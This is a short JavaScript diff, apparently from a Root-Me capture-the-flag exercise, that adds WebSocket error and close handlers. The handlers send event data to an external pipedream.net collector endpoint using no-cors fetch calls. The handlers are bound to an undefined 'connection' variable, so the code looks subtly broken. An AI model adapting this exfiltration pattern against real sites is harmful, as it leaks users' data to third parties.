@@ -5,6 +5,14 @@
     var websocket = new WebSocket('ws://ctf22.root-me.org/ws');
     websocket.onopen = start;
   websocket.onmessage = handleReply;
+  connection.onerror = function (error) {
+      fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error='+error, {mode: 'no-cors'});
+      location.reload()
+    };
+    connection.onclose = function(message) {
+        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?message='+message, {mode: 'no-cors'});
+    }
+
   function start(event) {
     websocket.send("hello");
   }
